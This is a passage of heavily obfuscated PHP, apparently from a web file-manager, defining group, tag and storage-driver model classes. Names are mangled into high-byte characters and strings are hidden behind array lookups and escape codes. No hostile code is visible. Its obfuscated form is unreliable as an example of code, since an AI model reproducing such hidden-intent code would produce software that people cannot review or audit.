unset($ø†üş½Ÿ); foreach ($Ç‹Øı«­ as &$¼¿ğ½ó) { $¼¿ğ½ó[$úñ»íÛË[475]] = array(); if (isset($æã·å¸µ[$¼¿ğ½ó[$úñ»íÛË[1854]]])) { $¼¿ğ½ó[$úñ»íÛË[475]] = $æã·å¸µ[$¼¿ğ½ó[$úñ»íÛË[1854]]]; } } unset($¼¿ğ½ó); } protected function parentLevelArray($œ¤Ì°äï) { $ÛåúÅ» =& $_SERVER[Ó¡Ÿ§‚]; $œ¤Ì°äï = explode($ÛåúÅ»[50], trim($œ¤Ì°äï, $ÛåúÅ»[50])); $œ¤Ì°äï = array_remove_value($œ¤Ì°äï, $ÛåúÅ»[198]); return $œ¤Ì°äï; } protected function parentInGroup($—ƒÕ„¨, $€ÌœÄï) { $ˆß„ù¸¤ =& $_SERVER[Ó¡Ÿ§‚]; $»€Ñ±ºê = $this->getInfoSimple($—ƒÕ„¨); if (!$»€Ñ±ºê) { return !0; } $²¨¬Ö£Œ = $this->parentLevelArray($»€Ñ±ºê[$ˆß„ù¸¤[520]]); $²¨¬Ö£Œ[] = $—ƒÕ„¨; foreach ($²¨¬Ö£Œ as $—ƒÕ„¨) { if (in_array($—ƒÕ„¨ . $ˆß„ù¸¤[12], $€ÌœÄï)) { return !0; } } return !1; } private function _listAppendParent(&$ŒÄàÉ¬ñ) { $˜›’İû =& $_SERVER[Ó¡Ÿ§‚]; $í¢ÉÈ« = array(); foreach ($ŒÄàÉ¬ñ as &$ü¥”¸°ß) { $í¢ÉÈ«[$ü¥”¸°ß[$˜›’İû[1854]]] = $ü¥”¸°ß[$˜›’İû[32]]; $·ÅÏì‰‘ = $this->parentLevelArray($ü¥”¸°ß[$˜›’İû[520]]); foreach ($·ÅÏì‰‘ as $€„¿·) { if (!isset($í¢ÉÈ«[$€„¿·])) { $í¢ÉÈ«[$€„¿·] = 0; } } } unset($ü¥”¸°ß); foreach ($í¢ÉÈ« as $‰æ¢ÏÁ => $€Ë¸¶Áì) { if ($€Ë¸¶Áì) { continue; } $ª ÉŒØ† = $this->getInfoSimple($‰æ¢ÏÁ); $í¢ÉÈ«[$‰æ¢ÏÁ] = $ª ÉŒØ†[$˜›’İû[32]]; } $ÙµÈÆ¯ = $GLOBALS[$˜›’İû[6]][$˜›’İû[89]][$˜›’İû[1957]]; if ($GLOBALS[$˜›’İû[503]] == $˜›’İû[88]) { $ÙµÈÆ¯ = !1; } foreach ($ŒÄàÉ¬ñ as &$ü¥”¸°ß) { $·ÅÏì‰‘ = $this->parentLevelArray($ü¥”¸°ß[$˜›’İû[520]]); $î˜‹şİØ = $˜›’İû[12]; foreach ($·ÅÏì‰‘ as $‰æ¢ÏÁ => $€„¿·) { if ($ÙµÈÆ¯ && $‰æ¢ÏÁ == 0) { continue; } $î˜‹şİØ .= $í¢ÉÈ«[$€„¿·] . $˜›’İû[8]; } if ($·ÅÏì‰‘) { $î˜‹şİØ .= $ü¥”¸°ß[$˜›’İû[32]]; } $ü¥”¸°ß[$˜›’İû[525]] = str_replace($˜›’İû[528], $˜›’İû[8], $î˜‹şİØ); } unset($ü¥”¸°ß); } private function _listAppendSourceRoot(&$÷ª­ŒØş, $ä²ü¹‹Ñ) { $Çˆ³Ä¹ =& $_SERVER[Ó¡Ÿ§‚]; $ŞÙÒ­ = Model($Çˆ³Ä¹[824])->listSourceRoot(SourceModel::TYPE_GROUP, $ä²ü¹‹Ñ); $ŞÙÒ­ = array_to_keyvalue($ŞÙÒ­, $Çˆ³Ä¹[505]); $ŞÙÒ­ = array_remove_key($ŞÙÒ­, $Çˆ³Ä¹[505]); foreach ($÷ª­ŒØş as &$ùë¦çşí) { $ùë¦çşí[$Çˆ³Ä¹[87]] = $ŞÙÒ­[$ùë¦çşí[$Çˆ³Ä¹[1854]]] ? $ŞÙÒ­[$ùë¦çşí[$Çˆ³Ä¹[1854]]] : array(); } unset($ùë¦çşí); } protected function groupMerge($¼Ëùßå×) { $¼Ëùßå× = array_values(array_unique($¼Ëùßå×)); $µ‚¸œè» = array(); for ($ìôÖŒÜ„ = 0; $ìôÖŒÜ„ < count($¼Ëùßå×); $ìôÖŒÜ„++) { $âÃ¿‰©‡ = !1; for ($ÀşØ‹¼á = 0; $ÀşØ‹¼á < count($¼Ëùßå×); $ÀşØ‹¼á++) { if ($ìôÖŒÜ„ == $ÀşØ‹¼á) { continue; } if ($this->isParentOf($¼Ëùßå×[$ÀşØ‹¼á], $¼Ëùßå×[$ìôÖŒÜ„])) { $âÃ¿‰©‡ = !0; break; } } if (!$âÃ¿‰©‡) { $µ‚¸œè»[] = $¼Ëùßå×[$ìôÖŒÜ„]; } } return $µ‚¸œè»; } protected function isParentOf($¸˜â€ãŠ, $ñ™æåÙ·) { $İÆ»¬ô× =& $_SERVER[Ó¡Ÿ§‚]; if (!$¸˜â€ãŠ || !$ñ™æåÙ· || $¸˜â€ãŠ == $ñ™æåÙ·) { return !1; } $Ğ£Äê = $this->getInfoSimple($¸˜â€ãŠ); $Ñ¥«¯Å“ = $this->getInfoSimple($ñ™æåÙ·); $‹Ò€ƒ¦Á = $Ğ£Äê[$İÆ»¬ô×[520]] . $¸˜â€ãŠ . $İÆ»¬ô×[50]; if (substr($Ñ¥«¯Å“[$İÆ»¬ô×[520]], 0, strlen($‹Ò€ƒ¦Á)) == $‹Ò€ƒ¦Á) { return !0; } return !1; } public function groupShowRoot($´”îä³», $ê›öˆª = false) { $İú±Çá =& $_SERVER[Ó¡Ÿ§‚]; $ğ¼å¼·õ = $this->getInfo($´”îä³»); if (!$ğ¼å¼·õ) { return array(); } $§ ˜Ä‚Ô = $this->parentLevelArray($ğ¼å¼·õ[$İú±Çá[520]]); $Çİ­æ¸ö = array($´”îä³»); if (count($§ ˜Ä‚Ô) == 0) { return $Çİ­æ¸ö; } if ($ê›öˆª && count($§ ˜Ä‚Ô) == 1) { return $Çİ­æ¸ö; } if (!$ğ¼å¼·õ[$İú±Çá[475]] || !isset($ğ¼å¼·õ[$İú±Çá[475]][$İú±Çá[1940]]) || $ğ¼å¼·õ[$İú±Çá[475]][$İú±Çá[1940]] == $İú±Çá[1909]) { return $this->groupShowRoot($§ ˜Ä‚Ô[count($§ ˜Ä‚Ô) - 1], $ê›öˆª); } if ($ğ¼å¼·õ[$İú±Çá[475]][$İú±Çá[1940]] == $İú±Çá[357]) { $œí¦Ôêø = explode($İú±Çá[50], $ğ¼å¼·õ[$İú±Çá[475]][$İú±Çá[1941]]); if ($œí¦Ôêø) { $Çİ­æ¸ö = array_merge($Çİ­æ¸ö, $œí¦Ôêø); } } return $Çİ­æ¸ö; } protected function resetParentLevel() { $®¶‰Ìä =& $_SERVER[Ó¡Ÿ§‚]; $Œá¯Û™ = $®¶‰Ìä[1854]; $Ş¡¼ıÏó = $this->select(); $Ş¡¼ıÏó = array_to_keyvalue($Ş¡¼ıÏó, $Œá¯Û™); foreach ($Ş¡¼ıÏó as $¿ÛĞ¯Á‹) { $¨ìÔ¯ = $¿ÛĞ¯Á‹; $¹ë…Ëøº = array(); while ($¨ìÔ¯[$®¶‰Ìä[441]] != 0) { $¹ë…Ëøº[] = $¨ìÔ¯[$®¶‰Ìä[441]]; $¨ìÔ¯ = $Ş¡¼ıÏó[$¨ìÔ¯[$®¶‰Ìä[441]]]; } $¹ë…Ëøº[] = 0; $¹ë…Ëøº = $®¶‰Ìä[50] . implode($®¶‰Ìä[50], array_reverse($¹ë…Ëøº)) . $®¶‰Ìä[50]; $this->setNamePinyin($¿ÛĞ¯Á‹[$Œá¯Û™], $¿ÛĞ¯Á‹[$®¶‰Ìä[32]]); $this->where(array($Œá¯Û™ => $¿ÛĞ¯Á‹[$Œá¯Û™]))->save(array($®¶‰Ìä[589] => $¹ë…Ëøº)); } return $Ş¡¼ıÏó; } public function groupNameAuto($åÈ¯íİş, $Úêèü×Ë) { $¡Ì÷ÎÑ  =& $_SERVER[Ó¡Ÿ§‚]; $†«‚áû¨ = $this->where(array($¡Ì÷ÎÑ [410] => $åÈ¯íİş))->getField($¡Ì÷ÎÑ [32], !0); if (!$†«‚áû¨ || !in_array($Úêèü×Ë, $†«‚áû¨)) { return $Úêèü×Ë; } for ($ÕÜ²¬Ş¿ = 1; $ÕÜ²¬Ş¿ <= count($†«‚áû¨) + 1; $ÕÜ²¬Ş¿++) { $À€©ö¥û = $Úêèü×Ë . "\x28{$ÕÜ²¬Ş¿}\x29"; if (!in_array($À€©ö¥û, $†«‚áû¨)) { return $À€©ö¥û; } } } public function groupSwitch($ôä•ŸÂò, $³Ì™ªì) { $Ï‚½åÔä =& $_SERVER[Ó¡Ÿ§‚]; $½‰™Ğ€ = array($Ï‚½åÔä[1854] => array($Ï‚½åÔä[7], array($ôä•ŸÂò, $³Ì™ªì))); $‹¨Á®´• = $this->where($½‰™Ğ€)->select(); $‹¨Á®´• = array_to_keyvalue($‹¨Á®´•, $Ï‚½åÔä[1854]); if (!isset($‹¨Á®´•[$ôä•ŸÂò]) || !isset($‹¨Á®´•[$³Ì™ªì]) || $‹¨Á®´•[$ôä•ŸÂò][$Ï‚½åÔä[441]] == 0) { return !1; } $½‰™Ğ€ = array($Ï‚½åÔä[1854] => $ôä•ŸÂò); $œİöØ¼ç = Model($Ï‚½åÔä[1944])->where($½‰™Ğ€)->select(); if (!$œİöØ¼ç) { $œİöØ¼ç = array(); } foreach ($œİöØ¼ç as $Ş‹Ÿ¬óŸ) { $ ´ûâÌ = $Ş‹Ÿ¬óŸ[$Ï‚½åÔä[1665]]; $½‰™Ğ€ = array($Ï‚½åÔä[1665] => $ ´ûâÌ, $Ï‚½åÔä[1854] => $³Ì™ªì); $Ó¨õïé = Model($Ï‚½åÔä[1944])->where($½‰™Ğ€)->find(); if (!$Ó¨õïé) { $ïù”ÖõÌ = array($³Ì™ªì => $Ş‹Ÿ¬óŸ[$Ï‚½åÔä[1958]]); Model($Ï‚½åÔä[534])->userGroupAdd($ ´ûâÌ, $ïù”ÖõÌ); } Model($Ï‚½åÔä[534])->userGroupRemove($ ´ûâÌ, $ôä•ŸÂò); } $½‰™Ğ€ = array($Ï‚½åÔä[420] => 2, $Ï‚½åÔä[441] => 0, $Ï‚½åÔä[419] => 1, $Ï‚½åÔä[505] => array($Ï‚½åÔä[7], array($ôä•ŸÂò, $³Ì™ªì))); $èŠ†Ëºª = Model($Ï‚½åÔä[824])->where($½‰™Ğ€)->field($Ï‚½åÔä[1959])->select(); $èŠ†Ëºª = array_to_keyvalue($èŠ†Ëºª, $Ï‚½åÔä[505], $Ï‚½åÔä[411]); $ÚÜ°¿ËĞ = !empty($èŠ†Ëºª[$ôä•ŸÂò]) ? $èŠ†Ëºª[$ôä•ŸÂò] : !1; if ($ÚÜ°¿ËĞ) { if (!$èŠ†Ëºª[$³Ì™ªì]) { $èŠ†Ëºª[$³Ì™ªì] = Model($Ï‚½åÔä[824])->groupRootAdd($³Ì™ªì); } $õÎä‹îş = $èŠ†Ëºª[$³Ì™ªì]; $½‰™Ğ€ = array($Ï‚½åÔä[441] => $ÚÜ°¿ËĞ); $èŠ†Ëºª = Model($Ï‚½åÔä[824])->where($½‰™Ğ€)->field($Ï‚½åÔä[1960])->select(); if (!$èŠ†Ëºª) { $èŠ†Ëºª = array(); } Model($Ï‚½åÔä[824])->moveClearAuth = !1; foreach ($èŠ†Ëºª as $ô£¢œòÆ) { $È±ïœ’ = $ô£¢œòÆ[$Ï‚½åÔä[419]] == $Ï‚½åÔä[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ï‚½åÔä[824])->move($ô£¢œòÆ[$Ï‚½åÔä[411]], $õÎä‹îş, $È±ïœ’); } Model($Ï‚½åÔä[824])->moveClearAuth = !0; $½‰™Ğ€ = array($Ï‚½åÔä[420] => 2, $Ï‚½åÔä[505] => $ôä•ŸÂò); $òËüÄ›Ÿ = array($Ï‚½åÔä[505] => $³Ì™ªì); Model($Ï‚½åÔä[1961])->where($½‰™Ğ€)->save($òËüÄ›Ÿ); Model($Ï‚½åÔä[1962])->where($½‰™Ğ€)->save($òËüÄ›Ÿ); } $this->_changeChildLevel($‹¨Á®´•[$ôä•ŸÂò], $‹¨Á®´•[$³Ì™ªì], !0); $this->where(array($Ï‚½åÔä[441] => $ôä•ŸÂò))->save(array($Ï‚½åÔä[441] => $³Ì™ªì)); $this->_clearChildrenCache($‹¨Á®´•[$³Ì™ªì]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($á½ÉÄ›¹) { $­ì„İÅú =& $_SERVER[Ó¡Ÿ§‚]; return array($­ì„İÅú[1963] => array($á½ÉÄ›¹[0], $­ì„İÅú[1964]), $­ì„İÅú[1965] => array($á½ÉÄ›¹[0], $­ì„İÅú[1966])); } protected function get($³æÙ¸ÕĞ) { $¾æé¾ıí =& $_SERVER[Ó¡Ÿ§‚]; $ó¼ˆ­ìÙ = Model($¾æé¾ıí[521])->metaGet($³æÙ¸ÕĞ, $¾æé¾ıí[1967]); $‘´¯˜ºÃ = json_decode($ó¼ˆ­ìÙ, !0); return $‘´¯˜ºÃ ? $‘´¯˜ºÃ : array($¾æé¾ıí[1968] => $¾æé¾ıí[88], $¾æé¾ıí[369] => array()); } protected function set($—‘Â¸‡¡, $œ¥íÇ³¦) { $¹¸şœÙí =& $_SERVER[Ó¡Ÿ§‚]; $œ¥íÇ³¦ = $œ¥íÇ³¦ ? $œ¥íÇ³¦ : array($¹¸şœÙí[1968] => $¹¸şœÙí[88], $¹¸şœÙí[369] => array()); return Model($¹¸şœÙí[521])->metaSet($—‘Â¸‡¡, $¹¸şœÙí[1967], json_encode($œ¥íÇ³¦)); } protected function getByTagID($•šıûˆÄ, $„ù¾îù„) { $à¥®ÁÓè =& $_SERVER[Ó¡Ÿ§‚]; if (!$•šıûˆÄ || !$„ù¾îù„) { return !1; } if (!Model($à¥®ÁÓè[521])->getInfoSimple($•šıûˆÄ)) { return !1; } $ÂåÌÓöÃ = $this->get($•šıûˆÄ); if (!$ÂåÌÓöÃ || !isset($ÂåÌÓöÃ[$à¥®ÁÓè[369]])) { return !1; } $£—ùã…ê = array_find_by_field($ÂåÌÓöÃ[$à¥®ÁÓè[369]], $à¥®ÁÓè[399], $„ù¾îù„); return is_array($£—ùã…ê) ? $£—ùã…ê : !1; } public function listSource($”Ï«¿«Å, $õ§™Ûƒö) { $˜‰Ÿ·ˆé =& $_SERVER[Ó¡Ÿ§‚]; if ($õ§™Ûƒö && !is_array($õ§™Ûƒö)) { $õ§™Ûƒö = array($õ§™Ûƒö); } $ö°ñ¾¡¢ = $this->listData($”Ï«¿«Å); $’ãéğ“„ = array(); foreach ($ö°ñ¾¡¢ as $àŒ ¯å) { $—íƒª™Ş = $àŒ ¯å[$˜‰Ÿ·ˆé[84]]; if (!$—íƒª™Ş) { continue; } if (!isset($’ãéğ“„[$—íƒª™Ş])) { $’ãéğ“„[$—íƒª™Ş] = array(); } $’ãéğ“„[$—íƒª™Ş][] = $àŒ ¯å[$˜‰Ÿ·ˆé[435]]; } $÷­Ó¡Š = array(); foreach ($’ãéğ“„ as $ØßËËäƒ => $Û©²ê) { $…ƒÕ¦›Ò = !0; if (!$õ§™Ûƒö) { $÷­Ó¡Š[] = $ØßËËäƒ; continue; } foreach ($õ§™Ûƒö as $û¾ŒÔ) { if (!in_array($û¾ŒÔ, $Û©²ê)) { $…ƒÕ¦›Ò = !1; break; } } if ($…ƒÕ¦›Ò) { $÷­Ó¡Š[] = $ØßËËäƒ; } } if (!$÷­Ó¡Š) { return array(); } $ÔÑâê£¦ = array($˜‰Ÿ·ˆé[426] => array($˜‰Ÿ·ˆé[427], $÷­Ó¡Š), $˜‰Ÿ·ˆé[505] => $”Ï«¿«Å, $˜‰Ÿ·ˆé[420] => SourceModel::TYPE_GROUP); $”“’ƒÏˆ = Model($˜‰Ÿ·ˆé[1338])->listSource($ÔÑâê£¦); if (!$”“’ƒÏˆ || count($÷­Ó¡Š) == $”“’ƒÏˆ[$˜‰Ÿ·ˆé[366]][$˜‰Ÿ·ˆé[367]]) { return $”“’ƒÏˆ; } $‹Ÿøªı¯ = array(); $ıÔíÒ”Õ = array_to_keyvalue($”“’ƒÏˆ[$˜‰Ÿ·ˆé[82]], $˜‰Ÿ·ˆé[12], $˜‰Ÿ·ˆé[411]); $ºÆ›¦‚ = array_to_keyvalue($”“’ƒÏˆ[$˜‰Ÿ·ˆé[83]], $˜‰Ÿ·ˆé[12], $˜‰Ÿ·ˆé[411]); $Á€èÅ´Ğ = array_merge($ºÆ›¦‚, $ıÔíÒ”Õ); foreach ($÷­Ó¡Š as $—íƒª™Ş) { if (!in_array($—íƒª™Ş, $Á€èÅ´Ğ)) { $‹Ÿøªı¯[] = $—íƒª™Ş; } } if ($‹Ÿøªı¯) { $this->removeBySource($”Ï«¿«Å, $‹Ÿøªı¯); } return $”“’ƒÏˆ; } protected function listData($‰ûû™•–) { $÷²óï =& $_SERVER[Ó¡Ÿ§‚]; $’ÛÆ€®¾ = array($÷²óï[1656] => 0, $÷²óï[492] => array($÷²óï[1969], 0), $÷²óï[431] => $÷²óï[1970] . $‰ûû™•–); $à¬ëíËÁ = $÷²óï[1971]; $ë´»îôÉ = $this->field($à¬ëíËÁ)->where($’ÛÆ€®¾)->order($÷²óï[1972])->select(); return $ë´»îôÉ ? $ë´»îôÉ : array(); } protected function addToTag($ãæ‡ˆ”š, $ ğ½½´, $ı­Ê§õ) { $æ­İƒ‚ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->getByTagID($ãæ‡ˆ”š, $ı­Ê§õ) || !$ ğ½½´) { return !1; } if (!Model($æ­İƒ‚[824])->pathInfo($ ğ½½´)) { return !1; } $ëŠà—ç± = array($æ­İƒ‚[1656] => 0, $æ­İƒ‚[492] => $ı­Ê§õ, $æ­İƒ‚[430] => $ ğ½½´, $æ­İƒ‚[431] => $æ­İƒ‚[1973] . $ãæ‡ˆ”š, $æ­İƒ‚[429] => $æ­İƒ‚[12], $æ­İƒ‚[1858] => 0); if ($this->where($ëŠà—ç±)->find()) { return !1; } return $this->add($ëŠà—ç±); } protected function removeFromTag($í„éæµ, $ª¯ééØÃ, $ìú“ãÉ¨) { $îƒ¯£Ü =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->getByTagID($í„éæµ, $ìú“ãÉ¨) || !$ª¯ééØÃ) { return !1; } if (is_array($ª¯ééØÃ)) { $ª¯ééØÃ = array($îƒ¯£Ü[7], $ª¯ééØÃ); } $ÃË°•ô = array($îƒ¯£Ü[1656] => 0, $îƒ¯£Ü[492] => $ìú“ãÉ¨, $îƒ¯£Ü[431] => $îƒ¯£Ü[1973] . $í„éæµ, $îƒ¯£Ü[430] => $ª¯ééØÃ); return $this->where($ÃË°•ô)->delete(); } protected function removeByTag($‰§‡ˆÑ˜, $ù€÷±’ù) { $®×À’ü“ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->getByTagID($‰§‡ˆÑ˜, $ù€÷±’ù)) { return !1; } $åšãÎåå = array($®×À’ü“[1656] => 0, $®×À’ü“[492] => $ù€÷±’ù, $®×À’ü“[431] => $®×À’ü“[1973] . $‰§‡ˆÑ˜); return $this->where($åšãÎåå)->delete(); } protected function removeBySource($ıõôÛ–, $€Å‘Ÿˆì) { $Á¬½ãÖ© =& $_SERVER[Ó¡Ÿ§‚]; if (!$ıõôÛ– || !$€Å‘Ÿˆì) { return !1; } if (is_array($€Å‘Ÿˆì)) { $€Å‘Ÿˆì = array($Á¬½ãÖ©[7], $€Å‘Ÿˆì); } $Ö–÷•Û = array($Á¬½ãÖ©[1656] => 0, $Á¬½ãÖ©[430] => $€Å‘Ÿˆì, $Á¬½ãÖ©[492] => array($Á¬½ãÖ©[1013], 0), $Á¬½ãÖ©[431] => $Á¬½ãÖ©[1973] . $ıõôÛ–); return $this->where($Ö–÷•Û)->delete(); } } goto cœ²¥‚ŠÇ¤; fëƒ†’‡Âº: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x73\157\165\162\x63\x65\123\x65\143\x72\x65\x74\114\x69\163\x74"; public $field = array("\163\157\165\x72\143\145\111\104", "\x74\171\x70\x65\111\104", "\x63\162\145\x61\x74\145\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\163\164\x6f\162\x61\x67\145\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x73\151\172\145\x4d\x61\x78", "\x73\x79\x73\x74\x65\155", "\144\x65\146\x61\x75\154\x74", "\x64\x72\x69\x76\x65\x72", "\x63\x6f\156\x66\x69\x67"); public function listData($ŸÊå½ßş = false, $ö‰ÓÑî± = "\x6d\x6f\x64\151\146\171\x54\151\x6d\145", $Á´›ñ» = false) { $‘©úòš =& $_SERVER[Ó¡Ÿ§‚]; $áªó•˜Š = parent::listData($ŸÊå½ßş, $ö‰ÓÑî±, $Á´›ñ»); if ($ŸÊå½ßş) { return $áªó•˜Š; } $¿ê— ªÛ = $this->ioSizeUseGet(array_to_keyvalue($áªó•˜Š, $‘©úòš[12], $‘©úòš[399])); foreach ($áªó•˜Š as $¨ÔÉ¯¸¾ => $ËšÊ Ëî) { unset($áªó•˜Š[$¨ÔÉ¯¸¾][$‘©úòš[6]]); $áªó•˜Š[$¨ÔÉ¯¸¾][$‘©úòš[1843]] = isset($¿ê— ªÛ[$ËšÊ Ëî[$‘©úòš[399]]]) ? $¿ê— ªÛ[$ËšÊ Ëî[$‘©úòš[399]]] : 0; } return $áªó•˜Š; } public function ioSizeUseGet($«­½•¥¶) { $ñÎˆŞ =& $_SERVER[Ó¡Ÿ§‚]; if (!$«­½•¥¶) { return array(); } $¦½ŸÇûÂ = $ñÎˆŞ[2170] . implode($ñÎˆŞ[50], $«­½•¥¶); $à¾ı˜õû = Cache::get($¦½ŸÇûÂ); if ($à¾ı˜õû) { return $à¾ı˜õû; } $äÑóï¢ = array($ñÎˆŞ[816] => $ñÎˆŞ[399], $ñÎˆŞ[2171] => $ñÎˆŞ[76]); $ëãÑŞ…æ = array($ñÎˆŞ[816] => array($ñÎˆŞ[7], $«­½•¥¶)); $à¾ı˜õû = Model($ñÎˆŞ[788])->field($äÑóï¢)->where($ëãÑŞ…æ)->group($ñÎˆŞ[816])->select(); $à¾ı˜õû = array_to_keyvalue($à¾ı˜õû, $ñÎˆŞ[399], $ñÎˆŞ[76]); Cache::set($¦½ŸÇûÂ, $à¾ı˜õû, 600); return $à¾ı˜õû; } public function getConfig($Øó¬»ò) { $äÚ‘€‘Ä = parent::listData($Øó¬»ò); return json_decode($äÚ‘€‘Ä[$_SERVER[Ó¡Ÿ§‚][6]], !0); } public function update($Ö€¸öäá, $®ŒÚùêà) { $êÊõ¢ë =& $_SERVER[Ó¡Ÿ§‚]; $·ÀÜ¼›¢ = $®ŒÚùêà[$êÊõ¢ë[32]]; $“Õâ›£ = array_to_keyvalue(parent::listData(), $êÊõ¢ë[32]); if (isset($“Õâ›£[$·ÀÜ¼›¢]) && $“Õâ›£[$·ÀÜ¼›¢][$êÊõ¢ë[399]] != $Ö€¸öäá) { return !1; } $this->checkPwd($Ö€¸öäá, $®ŒÚùêà); if (isset($®ŒÚùêà[$êÊõ¢ë[2172]]) && $®ŒÚùêà[$êÊõ¢ë[2172]] == $êÊõ¢ë[88]) { $this->checkConfig($®ŒÚùêà); } unset($®ŒÚùêà[$êÊõ¢ë[2172]]); $Ñ¶ËÛ– = parent::update($Ö€¸öäá, $®ŒÚùêà); if ($Ñ¶ËÛ– && $®ŒÚùêà[$êÊõ¢ë[37]]) { $£ôê€ü½ = 0; foreach ($“Õâ›£ as $ÆÙ¡ì’) { if ($ÆÙ¡ì’[$êÊõ¢ë[37]] && $ÆÙ¡ì’[$êÊõ¢ë[399]] != $Ö€¸öäá) { $£ôê€ü½ = $ÆÙ¡ì’[$êÊõ¢ë[399]]; parent::update($ÆÙ¡ì’[$êÊõ¢ë[399]], array($êÊõ¢ë[37] => 0)); } } $this->updateBackup($Ö€¸öäá, $£ôê€ü½); } return $Ñ¶ËÛ–; } public function add($Œù€Òîµ) { $çø±Á›Ù =& $_SERVER[Ó¡Ÿ§‚]; $¤Ûç¨¬ = array_to_keyvalue(parent::listData(), $çø±Á›Ù[32]); if (isset($¤Ûç¨¬[$Œù€Òîµ[$çø±Á›Ù[32]]])) { return !1; } $this->checkConfig($Œù€Òîµ); $³‡½òËº = parent::insert($Œù€Òîµ); if ($³‡½òËº && $Œù€Òîµ[$çø±Á›Ù[37]]) { foreach ($¤Ûç¨¬ as $“Ô°Û) { if ($“Ô°Û[$çø±Á›Ù[37]]) { parent::update($“Ô°Û[$çø±Á›Ù[399]], array($çø±Á›Ù[37] => 0)); } } } return $³‡½òËº; } public function updateBackup($å®£¸Ã, $ë¯½øãš) { $áÅ§¥Å =& $_SERVER[Ó¡Ÿ§‚]; if (!$ë¯½øãš) { return; } $¾ŠöëµÃ = Model($áÅ§¥Å[747])->config(); if ($¾ŠöëµÃ[$áÅ§¥Å[1635]] != $áÅ§¥Å[88] || $¾ŠöëµÃ[$áÅ§¥Å[750]] != $ë¯½øãš) { return; } $Õ—…çø = Model($áÅ§¥Å[769])->get($áÅ§¥Å[779]); $Õ—…çø = json_decode($Õ—…çø, !0); if (!$Õ—…çø) { return; } $Õ—…çø[$áÅ§¥Å[750]] = $å®£¸Ã; Model($áÅ§¥Å[769])->set(array($áÅ§¥Å[779] => $Õ—…çø)); } public function checkPwd($…Ö­Òá‹, &$ğµƒ²Ñ›) { $šÉÀóì© =& $_SERVER[Ó¡Ÿ§‚]; if (empty($ğµƒ²Ñ›[$šÉÀóì©[6]])) { return; } $ºÏì„ = json_decode($ğµƒ²Ñ›[$šÉÀóì©[6]], !0); $‡™¥”¿¢ = $šÉÀóì©[12]; $¥Å Ùü  = array($šÉÀóì©[2173], $šÉÀóì©[2174], $šÉÀóì©[888]); foreach ($¥Å Ùü  as $ù§ñæ²) { if (isset($ºÏì„[$ù§ñæ²])) { $‡™¥”¿¢ = $ù§ñæ²; break; } } if (!$‡™¥”¿¢) { return; } $Öìšç¼ = $this->getConfig($…Ö­Òá‹); $®©å³…Ó = $Öìšç¼[$‡™¥”¿¢]; $£ğµÉê“ = $ºÏì„[$‡™¥”¿¢]; if ($£ğµÉê“ == str_repeat($šÉÀóì©[189], strlen($®©å³…Ó))) { $ºÏì„[$‡™¥”¿¢] = $®©å³…Ó; $ğµƒ²Ñ›[$šÉÀóì©[6]] = json_encode($ºÏì„); } else { if ($£ğµÉê“ != $®©å³…Ó) { $ğµƒ²Ñ›[$šÉÀóì©[2172]] = $šÉÀóì©[88]; } } } public function checkConfig(&$˜¤¼šÀû, $›©’´˜„ = false) { $å¿±®ä =& $_SERVER[Ó¡Ÿ§‚]; $€„œÓÎî = strtolower($˜¤¼šÀû[$å¿±®ä[95]]); $¼Æ–Ñ÷Ó = json_decode($˜¤¼šÀû[$å¿±®ä[6]], !0); foreach ($¼Æ–Ñ÷Ó as $„Û¦‹ğî => $¶÷ú„àº) { $¼Æ–Ñ÷Ó[$„Û¦‹ğî] = trim($¶÷ú„àº); } $¼Æ–Ñ÷Ó[$å¿±®ä[2175]] = rand_string(6); $”À…´äó = $GLOBALS[$å¿±®ä[6]][$å¿±®ä[89]][$å¿±®ä[825]]; $ªİêõú = isset($”À…´äó[$€„œÓÎî]) ? $”À…´äó[$€„œÓÎî] : ucfirst($€„œÓÎî); $ÂÈöš¡ˆ = $å¿±®ä[74] . $ªİêõú; if (!$ªİêõú || !class_exists($ÂÈöš¡ˆ)) { if ($›©’´˜„) { return LNG($å¿±®ä[2176]); } write_log(array($å¿±®ä[2177], $˜¤¼šÀû, get_caller_info()), $å¿±®ä[2178]); show_json(LNG($å¿±®ä[2176]), !1, $˜¤¼šÀû); } $ìÈŠ“ò¼ = new $ÂÈöš¡ˆ($¼Æ–Ñ÷Ó); if (in_array($€„œÓÎî, $ìÈŠ“ò¼->objectDriver)) { if (!$ìÈŠ“ò¼->isBucketCors() && !$ìÈŠ“ò¼->setBucketCors()) { $ÕÓí‹É = LNG($å¿±®ä[2179]); $ÕÓí‹É .= $å¿±®ä[2180] . LNG($å¿±®ä[2181]); if ($›©’´˜„) { return $ÕÓí‹É; } show_json($ÕÓí‹É, !1); } } $‡¦Æİª = rtrim($¼Æ–Ñ÷Ó[$å¿±®ä[1179]], $å¿±®ä[8]) . $å¿±®ä[8]; $şš¡½”ü = $ìÈŠ“ò¼->getPath($‡¦Æİª . $å¿±®ä[1183]); if (!$ìÈŠ“ò¼->mkfile($şš¡½”ü)) { if ($›©’´˜„) { return LNG($å¿±®ä[2179]); } show_json(LNG($å¿±®ä[2179]), !1); } $¼Æ–Ñ÷Ó[$å¿±®ä[1179]] = $‡¦Æİª; $˜¤¼šÀû[$å¿±®ä[6]] = json_encode($¼Æ–Ñ÷Ó); $˜¤¼šÀû[$å¿±®ä[95]] = $ªİêõú; return !0; } public function driverListSystem() { $ô¶††•ô =& $_SERVER[Ó¡Ÿ§‚]; $ã³ª»•ã = parent::listData(); $åÎ°âª = array(); foreach ($ã³ª»•ã as $ùÙŞì¯) { unset($ùÙŞì¯[$ô¶††•ô[201]], $ùÙŞì¯[$ô¶††•ô[85]]); $ùÙŞì¯[$ô¶††•ô[6]] = json_decode($ùÙŞì¯[$ô¶††•ô[6]], !0); $åÎ°âª[] = $ùÙŞì¯; } return $åÎ°âª; } public function defaultDriver() { $×İ»Ä¢º =& $_SERVER[Ó¡Ÿ§‚]; $ç’±‹» = parent::listData(); $Œì ®ËÇ = array_filter_by_field($ç’±‹», $×İ»Ä¢º[37], 1); $Œì ®ËÇ = $Œì 